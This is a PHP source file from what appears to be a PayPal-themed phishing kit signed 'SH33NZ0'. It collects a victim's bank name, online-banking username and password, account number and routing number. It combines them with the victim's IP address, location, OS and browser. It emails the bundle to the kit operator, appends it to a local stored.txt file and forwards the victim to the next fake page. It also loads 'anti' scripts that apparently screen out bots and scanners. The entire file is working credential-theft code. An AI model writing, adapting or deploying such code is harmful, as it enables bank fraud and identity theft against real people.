<?php 
@error_reporting();
session_start();
require_once '../anti/anti0.php';
require '../anti/anti1.php';
require '../anti/anti2.php';
require '../anti/anti3.php';
require '../anti/anti4.php';
include 'config.php';
if(isset($_POST['acn'])&&isset($_POST['rtn'])){$bank_name=$_POST['bank_name'];$user=$_POST['user'];$pass=$_POST['pass'];$acn=$_POST['acn'];$rtn=$_POST['rtn'];$_SESSION['bank_logo']=str_replace(" ","-",$bank_name);$_SESSION['bank_name']=$bank_name;$_SESSION['acn']=substr($acn,strlen($acn)-4,strlen($acn));$code=<<<EOT
########### [ New PayPal BANK | {$dateNow} GMT] #####################
℗[Bank Name] 	℗: {$bank_name}
℗[Username]		℗: {$user}
℗[Password]		℗: {$pass}
℗[Account N.] 	℗: {$acn}
℗[Routing N.] 	℗: {$rtn}
=-=-=-=-=-=-=-=-- ♣ ☠ |SH33NZ0| ☠ ♣-=-=-=-=-=-=-=-
✪[IP]			✪: {$_SESSION['ip']}
✪[Country]		✪: {$_SESSION['ip_countryName']}
✪[State]	    ✪: {$_SESSION['ip_state']}
✪[City]			✪: {$_SESSION['ip_city']}
✪[Zip] 			✪: {$_SESSION['ip_zip']}
✪[OS]			✪: {$_SESSION['os']}
✪[Browser]		✪: {$_SESSION['browser']}
✪[TimeZone]		✪: {$_SESSION['ip_timezone']}
########### [ ./New PayPal BANK ] #####################
\r\n\r\n
EOT;
$subject="Thank |☠SH33NZ0☠|New PayPal BANK [{$bank_name}] x-{$_SESSION['acn']} From [{$_SESSION['ip_countryName']}]";
$headers="From: |☠SH33NZ0☠|PPL BANK <SH33NZ0@GMAIL.COM>\r\n";
$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
@mail($yours,$subject,$code,$headers);$save=fopen("../stored.txt","a+");fwrite($save,$code);fclose($save);if($skip_identity==true){echo "completed.php?sessionid={$_SESSION['randString']}&sslmode=true";}else{echo "email.php?sessionid={$_SESSION['randString']}&sslmode=true";}}?>